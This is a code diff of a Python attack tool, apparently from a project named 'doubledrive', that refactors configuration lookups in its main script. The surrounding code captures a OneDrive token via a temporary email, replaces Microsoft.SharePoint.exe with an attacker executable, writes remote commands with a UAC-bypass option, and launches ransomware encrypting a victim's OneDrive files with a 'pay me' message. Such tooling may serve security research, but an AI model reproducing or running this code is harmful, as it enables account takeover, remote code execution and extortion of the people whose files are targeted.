@@ -4,7 +4,7 @@ import urllib
 import requests
 import re
 
-import options
+from config import get_configs, ConfigKey
 from doubledrive.cloud_ransomware.onedrive_ransomware import OneDriveRansomware
 from doubledrive.endpoint_takeover_utils.temp_email import TempEmail
 from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
@@ -17,7 +17,7 @@ def save_token_in_cache(drive_id, token):
     
 
 def get_token_from_temp_email():
-    temp_email = TempEmail(options.TOKEN_DST_EMAIL_ADDRESS)
+    temp_email = TempEmail(get_configs()[ConfigKey.TOKEN_DST_EMAIL_ADDRESS.value])
     messages = temp_email.get_messages()
     last_message = messages[0]
     re_match = re.search("\"https://1drv.ms.*?\"", last_message.content)
@@ -51,7 +51,7 @@ def login_according_to_args(args, onedrive_session: OneDrive):
 
 def get_target_onedrive_items(onedrive_session: OneDrive):
     all_onedrive_files_to_encrypt = []
-    for item in options.JUNCTION_NAMES_TO_TARGET_PATHS.keys():
+    for item in get_configs()[ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value].keys():
         onedrive_junction_item = onedrive_session.get_item_by_path(f"/{item}")
         onedrive_junction_children = onedrive_session.list_children_recursively(onedrive_junction_item)
         items_to_encrypt = [item for item in onedrive_junction_children if isinstance(item, OneDriveFileItem)]
@@ -81,13 +81,14 @@ def parse_args():
 
 def main():
     args = parse_args()
+    configs = get_configs()
     onedrive_session = OneDrive()
     login_according_to_args(args, onedrive_session)
 
     if args.replace_sharepoint:
         with open("./dist/follow_attacker_commands.exe", "rb") as f:
             malicious_exe = f.read()
-        sharepoint_exe_onedrive_item = onedrive_session.get_item_by_path(f"/{options.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME}/Microsoft.SharePoint.exe")
+        sharepoint_exe_onedrive_item = onedrive_session.get_item_by_path(f"/{configs[ConfigKey.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME.value]}/Microsoft.SharePoint.exe")
         onedrive_session.modify_file_content(sharepoint_exe_onedrive_item, malicious_exe)
     
     if args.run_command:
@@ -95,12 +96,12 @@ def main():
             "uac": args.command_uac_bypass,
             "command": args.run_command
         }
-        onedrive_session.create_file(f"/{options.CMD_FILE_NAME}", json.dumps(cmd_dict).encode(), modify_if_exists=True)
+        onedrive_session.create_file(f"/{configs[ConfigKey.CMD_FILE_NAME.value]}", json.dumps(cmd_dict).encode(), modify_if_exists=True)
 
     if args.remote_ransomware:
         onedrive_ransomware = OneDriveRansomware(onedrive_session)
         all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session)
-        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, "pay me", quick_delete=options.QUICK_DELETE)
+        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, "pay me", quick_delete=configs[ConfigKey.QUICK_DELETE.value])
 
     
 
